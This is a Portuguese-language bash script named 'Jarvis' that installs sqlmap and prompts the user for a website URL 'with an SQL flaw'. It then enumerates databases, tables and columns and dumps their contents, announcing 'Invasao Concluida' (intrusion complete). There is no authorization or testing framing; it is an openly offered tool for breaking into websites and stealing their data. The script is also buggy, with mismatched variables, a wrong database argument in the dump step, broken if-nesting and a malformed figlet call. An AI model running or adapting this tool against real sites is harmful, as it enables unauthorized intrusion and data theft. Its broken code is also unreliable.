clear

verde='\033[1;32m'
amarelo='\033[1;33m'
azul='\033[1;34m'
cyan='\033[1;36m'
sem='\033[0m'
printf $azul
echo '[*]Criador: Senhor Loock                                                    '
printf $verde
echo 'GitHub: https://github.com/shoowl                                           '
printf $azul
echo '###########################################################################'
echo '###                                Jarvis                                ##'
echo '###########################################################################'
printf $verde
figlet -f mono12 'Jarvis'
printf $cyan
echo '[1] Instalar  SqlMap  [2] Execulta Jarvis Avançado                         [3] Execulta Jarvis Padrao [00] Sair'
read teste
if [ "$teste" = "1" ]
 then
clear
printf $azul
 echo "Instalando Sqlmap..."
  figlet -f mono12 "Jarvis"
   git clone https://github.com/sqlmapproject/sqlmap
    cd sqlmap
     
      cd ..
bash Jarvis.sh
fi

if [ "$teste" = "2" ]
 then
 clear
  printf $verde
   echo "[*]Criador: [*]Senhor Loock                                                [*]GitHub: https://github.com/shoowl                                        Telegram: @SenhorLoock "
    figlet -f mono12 "Jarvis" | lolcat
     echo "Digite o Link Do Site Com Falha Sql" | lolcat
      read url
       cd sqlmap
        python2 sqlmap.py --level 3 --risk 3 -u $url --dbs
         printf $amarelo
          echo "Ache a DataBase Do Site e Digite Abaixo" 
           read datab
             python2 sqlmap.py --level 3 --risk 3  -u $url -D $datab --tables
              printf cyan
               echo " Digite o Nome Da Tabela Desejada Abaixo"
                read tables
                 python2 sqlmap.py --level 3 --risk 3 -u $url -D $datab -T $tables --columns
                  printf $azul
                   echo "Digite o Nome Da Coluna Desejada"
                    read columns
                     python2 sqlmap.py --level 3 --risk 3 -u $url -D $tables -T $tables -C $columns --dump
                      echo "Invasao Concluida Digite [0] Para Volta"
                       read 0
                        if [ "$0" = "0" ]
                         then
                          cd ..
                           bash Jarvis.sh
                            fi
if [ "$teste" = "3" ]
 then
clear
 printf $cyan
  echo " [*]Criador: Senhor Loock"
   figlet -mono12 "JarvisV2" | lolcat
    printf $cyan
     echo "Digite o Url Com Falha Sql Abaixo"
      read url2
       cd sqlmap
        python2 sqlmap.py -u $url2 --dbs
         printf $azul
          echo "Ache o Nomr Da DataBase e Adicione Abaixo"
           read data2
            python2 sqlmap.py -u $url2 -D $data2 --tables
             printf $amarelo
              echo "Digite o Nome Da Tabela Abaixo"
               read tables2
                python2 sqlmap.py -u $url2 -D $data2 -T $tables --columns
                 printf $cyan
                  echo "Digite o Nome Da Coluna Abaixo"
                   read columns2
                    python2 sqlmap.py -u $url2 -D $data2 -T $tables -C $columns --dump
                     printf $verde
                      echo "Insvasao Concluida, Digite 0 Para Voltar..."
                       read 0b
                        if [ "$0b" = "0" ]
                         then
                          cd ..
                           bash Jarvis.sh
                            fi
fi

fi

if [ "$teste" = "00" ]
 then
printf $cyan
 figlet -f mono12 "Fechado"
exit 6
fi
